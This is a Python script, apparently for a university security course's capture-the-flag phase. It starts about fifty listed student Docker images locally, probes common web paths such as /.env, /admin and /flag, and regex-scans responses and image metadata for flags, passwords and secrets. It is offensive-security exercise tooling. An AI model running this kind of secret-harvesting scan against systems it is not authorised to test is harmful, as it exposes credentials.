#!/usr/bin/env python3
"""
Network-Only Docker Image Attack Script for CTF Flag Hunting
Author: Offensive Security Team
Purpose: Automated penetration testing for Phase 3 - IntSec 2025
Compliance: Network-based attacks only (no direct container interaction)
IMPORTANT: This script does NOT run any commands inside containers
"""

import docker
import re
import os
import sys
import json
import time
import requests
import threading
import concurrent.futures
from datetime import datetime
import platform
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Detect OS
IS_WINDOWS = platform.system() == 'Windows'

# Color codes for output
class Colors:
    if IS_WINDOWS:
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except:
            pass

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Target images
TARGET_IMAGES = [
    "elnino/intsec-2025:hardened-v2",
    "kv1st3n/passoire_final:latest",
    "albinheldebro/passoire_final:latest",
    "arsadraei/passoire_hardened:final",
    "akra9743/hardened-passoire:latest",
    "qilu2001/passoire-hardened:phase2",
    "cait7999/passoire-hardened:latest",
    "tiagomiguel29/hardened-passoire:latest",
    "bhanukac/group_27_intsec:v6",
    "emadetemad/passoire_hardened:latest",
    "viqingo/passoire-hardened-group34:latest",
    "aw950309/passoire:v4",
    "taro0510/passoire_36:v5",
    "maple1058/42_final_image:v1",
    "galaldh/passoire:hardened",
    "tomej2/group50repository:latest",
    "hampusbosson/grupp60_intsec:v3",
    "carmencanedo/intsec:passoire-final",
    "intsecgroup3/group3-app-image:v2.0",
    "lindaelize/passoire-merged:latest",
    "wallowa/passoire-intsec:latest",
    "emrenebiler/passoire_gr7:latest",
    "tylerponte/intsec:intsec-group8",
    "mikaellw/projectgroup9:latest",
    "theorjiugovictor/passoire:group10-v9",
    "rosella25/project_passoire:group_12",
    "chabsieger/passoire-secure:v1",
    "mellowcube/passoire-group18-modified:v1.0.0",
    "smariful/passoire-secure:v2",
    "aimo2926/passoire-hardened:v1",
    "huzaifa7470/group19_passoire_hardened:latest",
    "uthpalavi/passoire20-secure:v1",
    "thlak/group_23_passoire:modified",
    "gabbipls/new-passoire-intsec25:phase2",
    "deadbacteria8/passoire-grupp:latest",
    "hcipher/hardened-image:v3",
    "codyprince/test:latest",
    "shoveltime/passoire_group30_public:latest",
    "shahidalvit/passoire-hardened-by-group32:latest",
    "ichigoku/passoire:grupp33-v5",
    "martijnme/intro-sec-group-37:v1.1.7",
    "hiramlopez/passoire-38-v2:from-github",
    "kali6753/passoire:NEW",
    "madli/passoire:hardened",
    "fabiopereira98/project_group52:final",
    "hanjoh/group55:improved3",
    "askanberg/grupp57:v3",
    "g62intsec/g62intsec-public:latest",
    "alexkord/saferpoint:latest",
    "gl767077147/passoire-group-66:latest",
    "shamelwaseem/intsec_67:1.0",
    "intsec25group68/phase_2:final",
    "georgiosekapsas/intsec_group_69:v3",
]

# Flag patterns
FLAG_PATTERNS = [
    r'FLAG\{[^\}]+\}',
    r'flag\{[^\}]+\}',
    r'CTF\{[^\}]+\}',
    r'[A-F0-9]{32}',  # MD5
    r'[A-F0-9]{40}',  # SHA1
    r'flag[_:\s=]+[A-Za-z0-9_\-]+',
    r'password[_:\s=]+[A-Za-z0-9_\-]+',
    r'secret[_:\s=]+[A-Za-z0-9_\-]+',
]

# Global results storage
all_results = []
global_lock = threading.Lock()

def log(message, level="INFO"):
    """Enhanced logging with colors"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    colors = {
        "INFO": Colors.OKBLUE,
        "SUCCESS": Colors.OKGREEN,
        "WARNING": Colors.WARNING,
        "ERROR": Colors.FAIL,
        "FLAG": Colors.OKCYAN + Colors.BOLD
    }
    color = colors.get(level, Colors.ENDC)
    print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}", flush=True)

def save_flag(flag_value, method, image_name, comment=""):
    """Save discovered flag (thread-safe)"""
    with global_lock:
        # Check if this flag was already found for this image
        for result in all_results:
            if result["image"] == image_name and result["flag_value"] == flag_value:
                return

        # Find the next flag number for this image
        image_flags = [r for r in all_results if r["image"] == image_name]
        flag_num = len(image_flags) + 1

        result = {
            "flag_number": flag_num,
            "flag_value": flag_value,
            "discovery_method": method,
            "image": image_name,
            "comment": comment,
            "timestamp": datetime.now().isoformat()
        }
        all_results.append(result)

        log(f"🚩 FLAG #{flag_num} FOUND in {image_name}: {flag_value}", "FLAG")
        log(f"   Method: {method}", "FLAG")
        if comment:
            log(f"   Comment: {comment}", "FLAG")

def search_for_flags(text, image_name, method, context=""):
    """Search text for flag patterns"""
    if not text:
        return []

    found_flags = []
    text_str = str(text)

    for pattern in FLAG_PATTERNS:
        try:
            matches = re.finditer(pattern, text_str, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                flag_value = match.group(0).strip()
                if len(flag_value) > 5:
                    # Check if it looks like a real flag
                    if ('flag' in flag_value.lower() or 'ctf' in flag_value.upper() or
                            'password' in flag_value.lower() or 'secret' in flag_value.lower() or
                            len(flag_value) >= 32):
                        save_flag(flag_value, method, image_name, context)
                        found_flags.append(flag_value)
        except:
            pass

    return found_flags

def pull_image(client, image_name):
    """Pull Docker image if not present"""
    try:
        log(f"Checking/pulling {image_name}...")
        try:
            client.images.get(image_name)
            log(f"✓ Image {image_name} already exists", "SUCCESS")
            return True
        except docker.errors.ImageNotFound:
            log(f"Pulling {image_name}...")

            try:
                client.images.pull(image_name)
                log(f"✓ Successfully pulled {image_name}", "SUCCESS")
                return True
            except Exception as e:
                log(f"✗ Failed to pull {image_name}: {str(e)[:100]}", "ERROR")
                return False
    except Exception as e:
        log(f"✗ Error with {image_name}: {str(e)[:100]}", "ERROR")
        return False

def analyze_image_metadata(client, image_name):
    """
    COMPLIANT: Analyze image metadata and layers (static analysis)
    This does NOT run any commands in containers
    """
    log(f"🔍 Analyzing image metadata for {image_name}...")

    try:
        image = client.images.get(image_name)

        # Check image history (this is metadata, not running container)
        history = image.history()
        for idx, layer in enumerate(history):
            created_by = layer.get('CreatedBy', '')
            if created_by:
                search_for_flags(created_by, image_name, "Docker Image Layer Analysis",
                                 f"Found in layer {idx} command: {created_by[:50]}...")

        # Check configuration
        config = image.attrs.get('Config', {})

        # Environment variables (metadata only)
        env_vars = config.get('Env', [])
        for env in env_vars:
            search_for_flags(env, image_name, "Docker Environment Variables",
                             f"Env var: {env}")

        # Labels (metadata only)
        labels = config.get('Labels', {})
        if labels:
            for key, value in labels.items():
                search_for_flags(f"{key}={value}", image_name, "Docker Image Labels",
                                 f"Label {key}={value}")

        # Command and Entrypoint (metadata only)
        cmd = config.get('Cmd', [])
        entrypoint = config.get('Entrypoint', [])
        if cmd:
            search_for_flags(str(cmd), image_name, "Docker CMD", f"CMD: {str(cmd)[:50]}")
        if entrypoint:
            search_for_flags(str(entrypoint), image_name, "Docker ENTRYPOINT",
                             f"ENTRYPOINT: {str(entrypoint)[:50]}")

        # Working directory (metadata only)
        workdir = config.get('WorkingDir', '')
        if workdir:
            search_for_flags(workdir, image_name, "Docker Working Directory",
                             f"WorkingDir: {workdir}")

        log(f"✓ Metadata analysis complete for {image_name}", "SUCCESS")

    except Exception as e:
        log(f"✗ Metadata analysis error: {str(e)[:100]}", "ERROR")

def test_web_endpoint(port, image_name, method, path, headers, timeout=2):
    """Test a single web endpoint via network only"""
    try:
        url = f"http://localhost:{port}{path}"

        if method == 'GET':
            response = requests.get(url, timeout=timeout, headers=headers, verify=False)
        elif method == 'POST':
            response = requests.post(url, timeout=timeout, data={},
                                     headers=headers, verify=False)
        else:
            return False

        if response.status_code < 500:
            # Search for flags in response
            # DEBUG: Print what's being matched
            text = response.text
            for pattern in FLAG_PATTERNS:
                matches = re.findall(pattern, text, re.IGNORECASE)
                for m in matches:
                    if '0654a0823c2015b72407132de1940cbf' in m:
                        log(f"DEBUG: Found {m} in response from {url}", "WARNING")
                        log(f"DEBUG: Full response (first 500 chars): {text[:500]}", "WARNING")
            search_for_flags(response.text, image_name, "HTTP Response",
                             f"{method} {path} (Port {port}) - Status: {response.status_code}")

            # Search in headers
            header_str = str(response.headers)
            search_for_flags(header_str, image_name, "HTTP Headers",
                             f"Headers from {method} {path} (Port {port})")

            # Check for HTML comments
            if '<!--' in response.text:
                comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
                for comment in comments:
                    search_for_flags(comment, image_name, "HTML Comment",
                                     f"Comment from {path} (Port {port})")

            return True
    except requests.exceptions.ConnectionError:
        pass
    except Exception:
        pass

    return False

def network_attack_container(client, image_name):
    """
    COMPLIANT: Run container and attack ONLY via network
    Does NOT run any commands inside the container
    """
    log(f"🚀 Starting container for network-only attack: {image_name}...")

    container = None
    try:
        # Run container with random port mapping (network access only)
        container = client.containers.run(
            image_name,
            detach=True,
            # Map common HTTP ports to random host ports
            ports={
                '80/tcp': None,
                '443/tcp': None,
                '8080/tcp': None,
                '3000/tcp': None,
                '5000/tcp': None,
                '8000/tcp': None,
                '9000/tcp': None
            },
            remove=False,
            auto_remove=False,
            # Run with minimal privileges for safety
            mem_limit='512m',
            cpu_period=100000,
            cpu_quota=50000
        )

        # Give container time to start services
        log(f"Container started (ID: {container.short_id}), waiting for services...")
        time.sleep(8)

        # Refresh container info to get port mappings
        container.reload()
        network_settings = container.attrs['NetworkSettings']
        ports_info = network_settings.get('Ports', {})

        # Get host-accessible ports
        accessible_ports = []
        for container_port, host_bindings in ports_info.items():
            if host_bindings:
                for binding in host_bindings:
                    host_port = binding.get('HostPort')
                    if host_port:
                        accessible_ports.append(int(host_port))
                        log(f"Network mapping: {container_port} -> localhost:{host_port}")

        if not accessible_ports:
            log(f"No accessible ports found for {image_name}, testing common ports...", "WARNING")
            accessible_ports = [80, 443, 8080, 3000, 5000, 8000, 9000]

        log(f"Testing {len(accessible_ports)} ports via network (parallel)...")

        # Common paths to test via network
        common_paths = [
            '/', '/flag', '/flags', '/flag.txt', '/flags.txt',
            '/secret', '/secrets', '/admin', '/login',
            '/api', '/api/flag', '/api/flags',
            '/env', '/.env', '/config', '/configuration',
            '/robots.txt', '/sitemap.xml', '/debug', '/info',
            '/health', '/status', '/metrics'
        ]

        # Common HTTP methods to try
        headers = {
            'User-Agent': 'CTF-Network-Scanner/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        }

        # Use ThreadPoolExecutor for parallel network testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            futures = []
            for port in accessible_ports:
                for path in common_paths:
                    # Test GET requests
                    futures.append(
                        executor.submit(test_web_endpoint, port, image_name, 'GET',
                                        path, headers)
                    )
                    # Test POST requests for some paths
                    if path in ['/api', '/api/flag', '/login', '/admin']:
                        futures.append(
                            executor.submit(test_web_endpoint, port, image_name, 'POST',
                                            path, headers)
                        )

            # Wait for network tests to complete
            completed = 0
            for future in concurrent.futures.as_completed(futures, timeout=20):
                try:
                    future.result(timeout=1)
                    completed += 1
                except:
                    pass

        log(f"✓ Network testing complete: {completed}/{len(futures)} requests", "SUCCESS")

    except Exception as e:
        log(f"✗ Network attack error: {str(e)[:200]}", "ERROR")
    finally:
        # Always clean up the container
        if container:
            try:
                log(f"Stopping container {container.short_id}...")
                container.stop(timeout=3)
                container.remove()
                log(f"Container cleaned up", "INFO")
            except Exception as e:
                log(f"Error cleaning up container: {str(e)[:100]}", "WARNING")

def attack_single_image(client, image_name):
    """Attack single image with compliant techniques only"""
    log(f"\n{'='*70}", "INFO")
    log(f"🎯 ATTACKING: {image_name}", "INFO")
    log(f"{'='*70}", "INFO")

    # Reset flag counter for this image
    log(f"Flag counter reset for {image_name}", "INFO")

    if not pull_image(client, image_name):
        log(f"Skipping {image_name} - could not pull", "WARNING")
        return

    try:
        # PHASE 1: Static metadata analysis (compliant - no container execution)
        #analyze_image_metadata(client, image_name)

        # PHASE 2: Network-only attacks (compliant - only via network)
        network_attack_container(client, image_name)

        # Count flags found for this specific image
        image_flags = [r for r in all_results if r["image"] == image_name]
        log(f"✓ Completed attacking {image_name} - Found {len(image_flags)} flags", "SUCCESS")

    except Exception as e:
        log(f"✗ Error attacking {image_name}: {str(e)[:200]}", "ERROR")

def save_comprehensive_results():
    """Save comprehensive results including method details"""
    if not all_results:
        log("No flags found to save", "WARNING")
        return

    # Group results by image
    images_dict = {}
    for result in all_results:
        image_name = result["image"]
        if image_name not in images_dict:
            images_dict[image_name] = []
        images_dict[image_name].append(result)

    # Save detailed JSON
    with open('ctf_flags_detailed.json', 'w', encoding='utf-8') as f:
        json.dump({
            "total_flags": len(all_results),
            "images_scanned": len(images_dict),
            "flags_by_image": images_dict,
            "scan_timestamp": datetime.now().isoformat()
        }, f, indent=2, ensure_ascii=False)

    # Save simplified CSV format
    with open('ctf_flags_summary.csv', 'w', encoding='utf-8') as f:
        f.write("Image,Flag#,Flag Value,Discovery Method,Comment,Timestamp\n")
        for result in all_results:
            # Clean values for CSV
            flag_val = result['flag_value'].replace('"', '""')
            image_name = result['image'].replace('"', '""')
            method = result['discovery_method'].replace('"', '""')
            comment = result.get('comment', '').replace('"', '""').replace('\n', ' ')

            f.write(f'"{image_name}",{result["flag_number"]},"{flag_val}","{method}","{comment}",{result["timestamp"]}\n')

    # Save markdown report
    with open('ctf_report.md', 'w', encoding='utf-8') as f:
        f.write("# CTF Flag Hunting Report - Phase 3 IntSec 2025\n\n")
        f.write(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Total Flags Found:** {len(all_results)}\n")
        f.write(f"**Images Scanned:** {len(images_dict)}\n\n")
        f.write(f"**Compliance:** Network-only attacks (no container command execution)\n\n")

        f.write("## Summary by Image\n\n")
        for image_name, flags in images_dict.items():
            f.write(f"### {image_name}\n")
            f.write(f"- **Flags Found:** {len(flags)}\n")
            for flag in flags:
                f.write(f"  - Flag #{flag['flag_number']}: `{flag['flag_value']}` ({flag['discovery_method']})\n")
            f.write("\n")

        f.write("## Detailed Flag List\n\n")
        f.write("| # | Image | Flag # | Flag Value | Discovery Method | Comment |\n")
        f.write("|---|-------|--------|------------|------------------|---------|\n")

        global_counter = 1
        for image_name, flags in images_dict.items():
            image_short = image_name.split('/')[-1].split(':')[0]
            for flag in flags:
                flag_val = flag['flag_value']
                if len(flag_val) > 30:
                    flag_val = flag_val[:27] + "..."

                comment = flag.get('comment', '')
                if len(comment) > 40:
                    comment = comment[:37] + "..."

                f.write(f'| {global_counter} | {image_short} | {flag["flag_number"]} | `{flag_val}` | {flag["discovery_method"]} | {comment} |\n')
                global_counter += 1

def main():
    """Main orchestration"""
    print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}🔥 COMPLIANT DOCKER CTF ATTACK SCRIPT (NETWORK-ONLY) 🔥{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Phase 3: Network-Only Attacks - IntSec 2025{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Platform: {platform.system()} {platform.machine()}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Total targets: {len(TARGET_IMAGES)}{Colors.ENDC}")
    print(f"{Colors.WARNING}⚠️  COMPLIANCE: Network attacks only - NO direct container interaction{Colors.ENDC}")
    print(f"{Colors.WARNING}⚠️  No commands executed inside containers - Only network communication{Colors.ENDC}")
    print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}\n")

    # Compliance check
    log("COMPLIANCE CHECK: This script only performs:", "INFO")
    log("  1. Static image metadata analysis (compliant)", "INFO")
    log("  2. Network-based attacks via HTTP (compliant)", "INFO")
    log("  3. NO commands executed inside containers (compliant)", "INFO")
    print()

    try:
        client = docker.from_env()
        log("✓ Docker client initialized", "SUCCESS")
        client.ping()
        log("✓ Docker daemon is running", "SUCCESS")
    except Exception as e:
        log(f"✗ Failed to initialize Docker: {str(e)}", "ERROR")
        log("Make sure Docker Desktop is running!", "ERROR")
        if IS_WINDOWS:
            input("Press Enter to exit...")
        sys.exit(1)

    start_time = time.time()
    images_processed = 0

    # Attack each image
    for idx, image_name in enumerate(TARGET_IMAGES, 1):
        try:
            log(f"\n[{idx}/{len(TARGET_IMAGES)}] Processing {image_name}...", "INFO")
            attack_single_image(client, image_name)
            images_processed += 1

            # Save intermediate results after each image
            if all_results:
                with open('ctf_flags_detailed.json', 'w', encoding='utf-8') as f:
                    json.dump({
                        "total_flags": len(all_results),
                        "images_scanned": idx,
                        "scan_timestamp": datetime.now().isoformat(),
                        "flags": all_results
                    }, f, indent=2, ensure_ascii=False)

            # Brief pause between images to avoid overwhelming the system
            if idx < len(TARGET_IMAGES):
                time.sleep(2)

        except KeyboardInterrupt:
            log("Attack interrupted by user", "WARNING")
            break
        except Exception as e:
            log(f"✗ Fatal error processing {image_name}: {str(e)[:200]}", "ERROR")

    elapsed_time = time.time() - start_time

    # Save final results
    save_comprehensive_results()

    # Final output
    print(f"\n{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}🏆 ATTACK SUMMARY 🏆{Colors.ENDC}")
    print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
    log(f"Time elapsed: {elapsed_time/60:.2f} minutes", "INFO")
    log(f"Images processed: {images_processed}/{len(TARGET_IMAGES)}", "INFO")

    # Group results by image for display
    images_dict = {}
    for result in all_results:
        image_name = result["image"]
        if image_name not in images_dict:
            images_dict[image_name] = []
        images_dict[image_name].append(result)

    if all_results:
        log(f"🎉 Total flags found: {len(all_results)} across {len(images_dict)} images 🎉", "SUCCESS")

        print(f"\n{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
        print(f"{Colors.BOLD}{'Image':<30} {'Flags':<8} {'Sample Flag'}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")

        for image_name, flags in images_dict.items():
            image_short = image_name.split('/')[-1].split(':')[0]
            if len(image_short) > 28:
                image_short = image_short[:25] + "..."

            sample_flag = flags[0]['flag_value']
            if len(sample_flag) > 40:
                sample_flag = sample_flag[:37] + "..."

            print(f"{Colors.OKCYAN}{image_short:<30}{Colors.ENDC} {len(flags):<8} {sample_flag}")

        print(f"{Colors.OKGREEN}{'='*80}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}✓ Results saved to:{Colors.ENDC}")
        print(f"  {Colors.BOLD}- ctf_flags_detailed.json{Colors.ENDC} (complete data)")
        print(f"  {Colors.BOLD}- ctf_flags_summary.csv{Colors.ENDC} (CSV format)")
        print(f"  {Colors.BOLD}- ctf_report.md{Colors.ENDC} (markdown report)")

        # Show compliance confirmation
        print(f"\n{Colors.OKGREEN}✓ Compliance confirmed:{Colors.ENDC}")
        print(f"  {Colors.OKBLUE}• No commands executed inside containers{Colors.ENDC}")
        print(f"  {Colors.OKBLUE}• Only network-based attacks performed{Colors.ENDC}")
        print(f"  {Colors.OKBLUE}• Flag numbering reset for each image{Colors.ENDC}")
    else:
        log("⚠️  No flags found", "WARNING")

    print(f"\n{Colors.OKGREEN}✓ Network-only attack completed successfully!{Colors.ENDC}\n")
    if IS_WINDOWS:
        input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("\n⚠️  Attack interrupted by user", "WARNING")
        if all_results:
            save_comprehensive_results()
            log(f"Saved {len(all_results)} flags found so far", "INFO")
        if IS_WINDOWS:
            input("Press Enter to exit...")
        sys.exit(0)
    except Exception as e:
        log(f"✗ Fatal error: {str(e)}", "ERROR")
        import traceback
        traceback.print_exc()
        if IS_WINDOWS:
            input("Press Enter to exit...")
        sys.exit(1)
